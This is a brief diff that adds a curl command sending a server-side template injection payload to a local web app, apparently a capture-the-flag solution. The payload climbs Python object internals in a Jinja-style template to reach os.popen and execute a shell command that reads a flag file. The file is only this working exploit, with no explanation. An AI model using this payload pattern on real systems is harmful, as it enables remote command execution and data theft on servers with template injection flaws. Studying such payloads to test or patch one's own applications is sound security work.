@@ -1,0 +1,4 @@
+
+
+curl -L -X POST http://127.0.0.1:5000/ \
+-d "content={{''.__class__.__mro__[1].__subclasses__()[314].__init__.__globals__['sys'].modules['os'].popen('type flag').read()}}"
